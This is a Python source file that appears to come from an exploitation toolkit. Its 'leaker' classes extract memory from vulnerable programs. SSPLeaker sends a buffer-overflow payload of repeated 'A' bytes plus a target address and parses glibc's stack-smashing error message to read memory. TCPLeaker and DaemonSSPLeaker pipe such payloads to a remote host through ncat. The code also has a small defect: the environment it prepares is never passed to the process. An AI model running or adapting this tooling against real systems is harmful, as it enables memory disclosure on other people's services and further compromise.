import sys
import os
import subprocess

from .base import BaseLeaker, RegexParser, LeakerEOS, StaticInputParametersMixin, HasFinishedMixin
from .utils import convert_address_to_string




class SSPParser(RegexParser):
    def __init__(self):
        super(SSPParser, self).__init__(r'\*\*\* stack smashing detected \*\*\*: (.*) terminate')


class TextFileLeaker(HasFinishedMixin, StaticInputParametersMixin, BaseLeaker):
    def __init__(self, fileobj, parser=None):
        super(TextFileLeaker, self).__init__(parser=parser)

        if isinstance(fileobj, basestring):
            fileobj = open(fileobj, 'r')

        self.file = fileobj
        self.line_number = 0

    def input(self, *args, **kwargs):
        line = self.file.readline()

        self.logger.debug('line=%s' % line)

        if line == "":
            raise LeakerEOS()

        return line[:-1]

    def update(self):
        self.line_number += 1
        self._state.update({
            self.line_number: self._leak,
        })


class HTTPLeaker(BaseLeaker):
    def get_next_input_parameters(self):
        return (self.get_requests_method(), self.get_requests_url(),), {
            'params': self.get_requests_params(),
            'data':   self.get_requests_data(),
        }

    def get_requests_method(self):
        raise NotImplementedError('implement get_requests_method()')

    def get_requests_url(self):
        raise NotImplementedError('implement get_requests_url()')

    def get_requests_params(self):
        raise NotImplementedError('implement get_requests_params()')

    def get_requests_data(self):
        raise NotImplementedError('implement get_requests_data()')

    def input(self, *args, **kwargs):
        '''Take the same parameters of the requests call that will be done.'''
        import requests

        response = requests.request(*args, **kwargs)

        return response.content


class TCPLeaker(BaseLeaker):
    def __init__(self, host, port, **kwargs):
        super(TCPLeaker, self).__init__(**kwargs)

        self.host = host
        self.port = str(port)

    def input(self, *args, **kwargs):
        nc = subprocess.Popen(['ncat', self.host, self.port], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        stdout, stderr = nc.communicate(input=self.get_next_input_parameter())

        if stderr:
            self.logger.info('input stderr: %s' % stderr)

        return stdout


class SSPLeaker(BaseLeaker):
    def __init__(self, address, offset, cmd=None, **kwargs):
        super(SSPLeaker, self).__init__(**kwargs)

        if not cmd:
            raise AttributeError('cmd must be specified')

        self.cmd     = cmd
        self.address = address
        self.offset  = offset

    def input(self, input, **kwargs):
        # In this case is tricky to get the output: we need to add LIBC_FATAL_STDERR_ to environment variables
        # and interact with the stderr
        env = os.environ.copy()
        env.update({
            'LIBC_FATAL_STDERR_': 1,
        })
        nc = subprocess.Popen(self.cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = nc.communicate(input=input)

        return stderr

    def get_next_input_parameter(self):
        return "\x41" * self.offset + convert_address_to_string(self.address)

    def update(self):
        """
        The SSP leak a memory content up to a null byte that is not
        included, here we add the missing byte and update the address accordingly.
        """
        updated_leak = self._leak + "\x00"

        leaked_bytes_number = len(updated_leak)
        #print >> sys.stderr, " >", leaked_bytes_number
        self.address += leaked_bytes_number

        return updated_leak

    def output(self, leak):
        sys.stdout.write(leak)
        sys.stdout.flush()


class DaemonSSPLeaker(TCPLeaker):
    def __init__(self, host, port, address, offset, **kwargs):
        super(DaemonSSPLeaker, self).__init__(host, port, **kwargs)

        self.address = address
        self.offset  = offset
